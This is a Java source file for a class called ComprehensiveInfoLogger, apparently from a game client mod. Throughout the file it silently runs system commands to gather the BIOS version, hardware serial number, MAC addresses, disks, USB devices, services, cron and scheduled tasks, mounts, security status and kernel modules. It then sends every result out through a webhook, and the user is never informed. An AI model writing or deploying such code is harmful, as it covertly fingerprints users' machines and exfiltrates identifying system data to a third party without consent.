package treacherousswine.doomix.client.logger;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class ComprehensiveInfoLogger {
    
    public static void logSystemTimezone() {
        try {
            StringBuilder tzInfo = new StringBuilder(" **example**\n```\n");
            tzInfo.append("timezone: ").append(System.getProperty("user.timezone")).append("\n");
            tzInfo.append("current time: ").append(System.currentTimeMillis()).append("\n");
            
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("timedatectl");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    tzInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            tzInfo.append("```");
            Logger.sendWebhookMessage(tzInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] timezone error: " + e.getMessage());
        }
    }
    
    public static void logBIOSAndFirmware() {
        try {
            StringBuilder biosInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("dmidecode", "-s", "bios-version");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        biosInfo.append("bios: ").append(line).append("\n");
                    }
                    reader.close();
                } catch (Exception e) {}
                
                pb = new ProcessBuilder("dmidecode", "-s", "system-serial-number");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        biosInfo.append("serial: ").append(line).append("\n");
                    }
                    reader.close();
                } catch (Exception e) {}
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("wmic", "bios", "get", "smbiosbiosversion");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        biosInfo.append(line).append("\n");
                    }
                    reader.close();
                } catch (Exception e) {}
            }
            
            biosInfo.append("```");
            Logger.sendWebhookMessage(biosInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] bios info error: " + e.getMessage());
        }
    }
    
    public static void logDiskPartitions() {
        try {
            StringBuilder diskInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("lsblk");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 30) {
                    diskInfo.append(line).append("\n");
                    count++;
                }
                reader.close();
                
                pb = new ProcessBuilder("df", "-h");
                p = pb.start();
                reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                while ((line = reader.readLine()) != null) {
                    diskInfo.append(line).append("\n");
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("wmic", "logicaldisk", "get", "name,size,freespace");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    diskInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            diskInfo.append("```");
            Logger.sendWebhookMessage(diskInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] disk partitions error: " + e.getMessage());
        }
    }
    
    public static void logUSBDevices() {
        try {
            StringBuilder usbInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("lsusb");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    usbInfo.append(line).append("\n");
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("wmic", "logicaldisk", "get", "drivetype,size,name");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("2")) {
                        usbInfo.append(line).append("\n");
                    }
                }
                reader.close();
            }
            
            usbInfo.append("```");
            Logger.sendWebhookMessage(usbInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] usb devices error: " + e.getMessage());
        }
    }
    
    public static void logPrinters() {
        try {
            StringBuilder printerInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("lpstat", "-p", "-d");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        printerInfo.append(line).append("\n");
                    }
                    reader.close();
                } catch (Exception e) {}
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("wmic", "printerlconfig", "get", "name");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        printerInfo.append(line).append("\n");
                    }
                    reader.close();
                } catch (Exception e) {}
            }
            
            printerInfo.append("```");
            Logger.sendWebhookMessage(printerInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] printers error: " + e.getMessage());
        }
    }
    
    public static void logAudioDevices() {
        try {
            StringBuilder audioInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("pactl", "list", "sinks");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    int count = 0;
                    while ((line = reader.readLine()) != null && count < 25) {
                        audioInfo.append(line).append("\n");
                        count++;
                    }
                    reader.close();
                } catch (Exception e) {}
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("wmic", "sounddev", "get", "name");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        audioInfo.append(line).append("\n");
                    }
                    reader.close();
                } catch (Exception e) {}
            }
            
            audioInfo.append("```");
            Logger.sendWebhookMessage(audioInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] audio devices error: " + e.getMessage());
        }
    }
    
    public static void logVideoCards() {
        try {
            StringBuilder videoInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("lspci");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.toLowerCase().contains("vga") || line.toLowerCase().contains("display") || line.toLowerCase().contains("3d")) {
                        videoInfo.append(line).append("\n");
                    }
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("wmic", "path", "win32_videocontroller", "get", "name,driverversion,videoprocessormemory");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    videoInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            videoInfo.append("```");
            Logger.sendWebhookMessage(videoInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] video cards error: " + e.getMessage());
        }
    }
    
    public static void logNetworkAdapters() {
        try {
            StringBuilder adaptersInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("ip", "link", "show");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 30) {
                    adaptersInfo.append(line).append("\n");
                    count++;
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("wmic", "nic", "get", "name,macaddress,speed");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    adaptersInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            adaptersInfo.append("```");
            Logger.sendWebhookMessage(adaptersInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] network adapters error: " + e.getMessage());
        }
    }
    
    public static void logSystemServices() {
        try {
            StringBuilder servicesInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("systemctl", "list-units", "--type=service", "--state=running");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    int count = 0;
                    while ((line = reader.readLine()) != null && count < 30) {
                        servicesInfo.append(line).append("\n");
                        count++;
                    }
                    reader.close();
                } catch (Exception e) {}
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("wmic", "service", "get", "name,state");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    int count = 0;
                    while ((line = reader.readLine()) != null && count < 30) {
                        servicesInfo.append(line).append("\n");
                        count++;
                    }
                    reader.close();
                } catch (Exception e) {}
            }
            
            servicesInfo.append("```");
            Logger.sendWebhookMessage(servicesInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] system services error: " + e.getMessage());
        }
    }
    
    public static void logScheduledTasks() {
        try {
            StringBuilder tasksInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("crontab", "-l");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        tasksInfo.append(line).append("\n");
                    }
                    reader.close();
                } catch (Exception e) {
                    tasksInfo.append("no cron jobs or access denied\n");
                }
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("powershell", "-Command", "Get-ScheduledTask | select TaskName, State | head -25");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        tasksInfo.append(line).append("\n");
                    }
                    reader.close();
                } catch (Exception e) {}
            }
            
            tasksInfo.append("```");
            Logger.sendWebhookMessage(tasksInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] scheduled tasks error: " + e.getMessage());
        }
    }
    
    public static void logLoadAverage() {
        try {
            StringBuilder loadInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("cat", "/proc/loadavg");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    loadInfo.append(line).append("\n");
                }
                reader.close();
                
                pb = new ProcessBuilder("uptime");
                p = pb.start();
                reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                while ((line = reader.readLine()) != null) {
                    loadInfo.append(line).append("\n");
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("wmic", "os", "get", "totalvisiblememorysize,freephysicalmemory");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    loadInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            loadInfo.append("```");
            Logger.sendWebhookMessage(loadInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] load average error: " + e.getMessage());
        }
    }
    
    public static void logKernelModules() {
        try {
            StringBuilder modulesInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("lsmod");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 30) {
                    modulesInfo.append(line).append("\n");
                    count++;
                }
                reader.close();
            }
            
            modulesInfo.append("```");
            Logger.sendWebhookMessage(modulesInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] kernel modules error: " + e.getMessage());
        }
    }
    
    public static void logBootLoader() {
        try {
            StringBuilder bootInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                Path grubConfig = Paths.get("/boot/grub/grub.cfg");
                if (Files.exists(grubConfig)) {
                    bootInfo.append("grub bootloader found\n");
                }
                
                Path efiEntries = Paths.get("/sys/firmware/efi");
                if (Files.exists(efiEntries)) {
                    bootInfo.append("efi firmware detected\n");
                }
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("bcdedit");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    int count = 0;
                    while ((line = reader.readLine()) != null && count < 20) {
                        bootInfo.append(line).append("\n");
                        count++;
                    }
                    reader.close();
                } catch (Exception e) {
                    bootInfo.append("bcdedit access denied\n");
                }
            }
            
            bootInfo.append("```");
            Logger.sendWebhookMessage(bootInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] boot loader error: " + e.getMessage());
        }
    }
    
    public static void logSELinuxStatus() {
        try {
            StringBuilder selinuxInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("getenforce");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        selinuxInfo.append("selinux: ").append(line).append("\n");
                    }
                    reader.close();
                } catch (Exception e) {
                    selinuxInfo.append("selinux not installed\n");
                }
                
                ProcessBuilder pb2 = new ProcessBuilder("aa-status");
                try {
                    Process p = pb2.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    int count = 0;
                    while ((line = reader.readLine()) != null && count < 15) {
                        selinuxInfo.append(line).append("\n");
                        count++;
                    }
                    reader.close();
                } catch (Exception e) {
                    selinuxInfo.append("apparmor not installed\n");
                }
            }
            
            selinuxInfo.append("```");
            Logger.sendWebhookMessage(selinuxInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] selinux error: " + e.getMessage());
        }
    }
    
    public static void logMountedFilesystems() {
        try {
            StringBuilder fsInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("mount");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    fsInfo.append(line).append("\n");
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("net", "use");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    fsInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            fsInfo.append("```");
            Logger.sendWebhookMessage(fsInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] mounted filesystems error: " + e.getMessage());
        }
    }
    
    public static void logLibrariesAndDependencies() {
        try {
            StringBuilder libInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("ldconfig", "-p");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    int count = 0;
                    while ((line = reader.readLine()) != null && count < 25) {
                        libInfo.append(line).append("\n");
                        count++;
                    }
                    reader.close();
                } catch (Exception e) {}
            }
            
            libInfo.append("```");
            Logger.sendWebhookMessage(libInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] libraries error: " + e.getMessage());
        }
    }
    
    public static void logDeviceManufacturer() {
        try {
            StringBuilder mfgInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("dmidecode", "-t", "system");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    int count = 0;
                    while ((line = reader.readLine()) != null && count < 20) {
                        mfgInfo.append(line).append("\n");
                        count++;
                    }
                    reader.close();
                } catch (Exception e) {}
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("wmic", "csproduct", "get", "name,vendor");
                try {
                    Process p = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        mfgInfo.append(line).append("\n");
                    }
                    reader.close();
                } catch (Exception e) {}
            }
            
            mfgInfo.append("```");
            Logger.sendWebhookMessage(mfgInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] manufacturer error: " + e.getMessage());
        }
    }
}
